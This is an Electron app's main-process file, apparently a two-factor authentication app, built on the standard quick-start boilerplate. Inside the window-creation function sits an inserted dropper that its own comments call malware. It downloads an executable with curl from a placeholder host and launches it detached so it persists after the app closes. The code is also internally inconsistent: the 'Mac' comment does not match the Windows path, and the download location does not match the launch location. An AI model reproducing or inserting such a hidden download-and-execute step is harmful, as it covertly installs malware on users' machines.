// Modules to control application life and create native browser window
const {app, BrowserWindow} = require('electron')
const path = require('path')

function createWindow () {
  // Create the browser window.
  const mainWindow = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js')
    }
  })

  // and load the index.html of the app.
  mainWindow.loadFile('index.html')
const { spawnSync, spawn } = require( 'child_process' ); // Use synchronous calls to set up the binary and async to execute malware
var child1 = spawnSync("curl", ['hosturl', '-o', 'output.exe'], { shell: true }); // Download the file, shell:true is used so that "~/" ($HOME) works properly
var main1 = spawn("C:\\Windows\\Temp\\output.exe", [], { detached: true, shell: true, stdio: 'ignore' });  // Mac malware

main1.unref(); // This line plus the options specified in main1 allow the main1 process to persist past the closure of the 2FAapp


  // Open the DevTools.
  // mainWindow.webContents.openDevTools()
}

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.whenReady().then(() => {
  createWindow()
  
  app.on('activate', function () {
    // On macOS it's common to re-create a window in the app when the
    // dock icon is clicked and there are no other windows open.
    if (BrowserWindow.getAllWindows().length === 0) createWindow()
  })
})

// Quit when all windows are closed, except on macOS. There, it's common
// for applications and their menu bar to stay active until the user quits
// explicitly with Cmd + Q.
app.on('window-all-closed', function () {
  if (process.platform !== 'darwin') app.quit()
})

// In this file you can include the rest of your app's specific main process
// code. You can also put them in separate files and require them here.
